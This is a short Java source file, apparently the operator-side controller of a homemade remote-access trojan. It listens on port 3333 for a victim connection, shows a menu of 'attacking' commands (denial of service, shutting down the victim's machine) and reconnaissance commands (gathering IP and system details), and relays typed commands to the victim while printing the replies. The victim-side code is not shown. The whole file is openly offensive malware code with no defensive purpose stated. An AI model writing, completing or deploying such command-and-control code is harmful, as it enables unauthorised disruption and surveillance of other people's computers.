package local.attack;
import java.net.*;
import java.io.*;
public class Attack {

	public static void main(String[] args) throws Exception {
		ServerSocket ss=new ServerSocket(3333);
		Socket s=ss.accept();
		System.out.println("----------ATTACKING COMMANDS----------");
		System.out.println("1.'dos' [making the victim's system unavailable]");
		System.out.println("2.'shut' [shutdown thw victim's system]");
		System.out.println("----------INFORMAION GATHERING COMMANDS----------");
		System.out.println("1.'ip' [Gathering all details about the ip]");
		System.out.println("2.'syspec' [Gathering all the System details]");
		DataInputStream din=new DataInputStream(s.getInputStream());
		DataOutputStream dout=new DataOutputStream(s.getOutputStream());
		BufferedReader br=new BufferedReader(new InputStreamReader(System.in));
		String vic="",att="";
		while(!att.equals("stop")) {
			att=br.readLine();
			dout.writeUTF(att);
			if(att.equals("dos")|| att.equals("shut") || att.equals("ip") || att.equals("syspec")) {
				vic=din.readUTF();
				System.out.println(vic);
			}
			dout.flush();
			
		}
		din.close();
		s.close();
		ss.close();
	}

}
